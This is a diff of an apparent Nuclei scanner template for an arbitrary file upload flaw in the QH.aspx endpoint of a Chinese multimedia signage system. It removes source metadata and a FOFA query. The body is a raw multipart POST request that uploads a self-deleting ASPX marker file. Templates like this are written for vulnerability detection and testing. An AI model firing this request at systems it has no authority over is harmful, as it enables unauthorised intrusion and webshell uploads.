@@ -3,20 +3,14 @@ info:
   name: 和丰多媒体信息发布系统 QH.aspx 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/msganxpodz74alg9'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: msganxpodz74alg9
-    fofa: app="和丰山海-数字标牌"
 http:
 - raw:
   - 'POST /QH.aspx HTTP/1.1
 
 
     Content-Type: multipart/form-data; boundary=----Guhkjfbjhfbjbhjbrkeyhugbbubuj
-
-
 
 
     ------Guhkjfbjhfbjbhjbrkeyhugbbubuj
@@ -28,8 +22,6 @@ http:
     Content-Type: application/octet-stream
 
 
-
-
     <%@ Page Language="C#"%><% Response.Write("DudeSuite");System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]); %>
 
 
@@ -37,8 +29,6 @@ http:
 
 
     Content-Disposition: form-data; name="action"
-
-
 
 
     upload
@@ -50,8 +40,6 @@ http:
     Content-Disposition: form-data; name="responderId"
 
 
-
-
     ResourceNewResponder
 
 
@@ -59,8 +47,6 @@ http:
 
 
     Content-Disposition: form-data; name="remotePath"
-
-
 
 
     /opt/resources
